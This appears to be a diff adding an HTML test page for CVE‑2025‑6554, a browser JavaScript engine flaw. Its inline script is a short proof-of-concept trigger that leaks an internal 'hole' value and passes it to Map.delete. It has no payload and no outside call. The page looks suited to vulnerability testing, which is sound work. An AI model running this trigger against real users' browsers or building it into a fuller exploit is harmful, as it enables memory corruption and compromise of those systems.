@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head><title>Test CVE‑2025‑6554</title></head>
+<body>
+  <script>
+    // PoC code from DarkNavy or the simple snippet
+    function f() {
+      let x;
+      delete x?.[y]?.a;
+      return y;
+      let y;
+    }
+    let hole = f();
+    let map = new Map();
+    map.delete(hole);
+    console.log("Finished test");
+  </script>
+</body>
+</html>
